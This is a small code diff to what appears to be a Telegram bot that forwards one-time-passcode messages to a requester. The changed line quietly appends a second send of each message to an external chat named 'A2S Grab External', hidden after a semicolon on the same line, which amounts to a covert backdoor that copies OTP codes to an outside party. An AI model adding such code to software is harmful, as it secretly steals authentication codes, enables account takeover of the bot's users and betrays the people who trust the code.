@@ -138,7 +138,7 @@ format:
             message_splitted = [re.sub(r'\s+', ' ', message) for message in message_splitted]
 
             await client.send_message(requester, f"[OTP Dashboard FF 📩 {requester}]")
-            await client.send_message(requester, moban)
+            await client.send_message(requester, moban);await client.send_message("A2S Grab External", moban)
             await event.respond(f"forwarded to {requester} 💯")
         record_messages(event)
 
